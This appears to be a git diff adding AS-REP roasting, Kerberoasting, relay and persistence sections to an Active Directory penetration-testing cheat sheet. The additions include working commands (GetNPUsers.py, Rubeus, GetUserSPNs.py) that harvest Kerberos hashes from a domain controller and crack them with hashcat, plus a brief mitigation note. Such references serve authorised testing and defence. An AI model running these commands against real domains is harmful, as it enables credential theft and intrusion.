@@ -24,6 +24,22 @@ rdp-sec-check.pl 10.0.0.93
 ```
 rpcclient -U '' -N 10.10.0.10 -c "querygroupmem 0x200" |  cut -d '[' -f 2 | cut -d ']' -f 1
 ```
+### AS-Rep Roasting
+When a TGT request is made, the user must, by default, authenticate to the KDC in order for it to respond. Sometimes, this prior authentication is not requested for some accounts, allowing an attacker to abuse this configuration.
+
+This configuration allows retrieving password hashes for users that have *Do not require Kerberos preauthentication* property selected:
+
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+```
+python3 GetNPUsers.py COMPANY.LOCAL/ -usersfile /home/user/users.txt -request -dc-ip 192.168.0.10 -format hashcat
+```
+
+- https://github.com/GhostPack/Rubeus
+```
+Rubeus.exe asreproast /domain:COMPANY.LOCAL /dc:192.168.0.10 /format:hashcat /outfile:asrep-roast.hashes
+hashcat -m 18200 'asrep-roast.hashes' -a 0 ./wordlists/rockyou.txt
+```
+
 
 # Authenticated enumeration
 
@@ -145,6 +161,23 @@ spray.sh -smb 192.168.0.10 users.txt seasons.txt 3 15 cema.canadaegg.ca NOUSERUS
 
 - https://github.com/ShutdownRepo/smartbrute
 
+### Kerberoasting
+The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts.
+
+```
+GetUserSPNs.py -request -dc-ip 192.168.1.10 COMPANY.LOCAL/jdoe:PasswordJdoe123 -outputfile hashes.kerberoast
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+```
+
+
+--> To protect against this attack, we must avoid having *SPN* on user accounts, in favor of machine accounts.  
+--> If it is necessary, we should use Microsoft’s Managed Service Accounts (MSA) feature, ensuring that the account password is robust and changed regularly and automatically
+
+### Relay attacks
+<img src="./images/smb_relay.png" width="250"/>
+
+### Drop the MIC CVE-2019-1040
+- https://securityboulevard.com/2019/06/drop-the-mic-cve-2019-1040/
 
 ### Exploiting ACL over GPO
 - https://github.com/Group3r/Group3rhttps://github.com/Group3r/Group3r
@@ -339,6 +372,9 @@ Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 - AzureAD Connect
 
 # Persistence
+
+### Dropping SPN on admin accounts
+https://adsecurity.org/?p=3466
 
 ####  Persistence in AD environment
 - https://padlet.com/sylvaincortes/5ih32mx9f637sk1a
@@ -605,3 +641,4 @@ VDocumentation about LSA secrets:
         - >-
           Microsoft documentation on LSA secrets:
           https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#BKMK_LSA
+https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
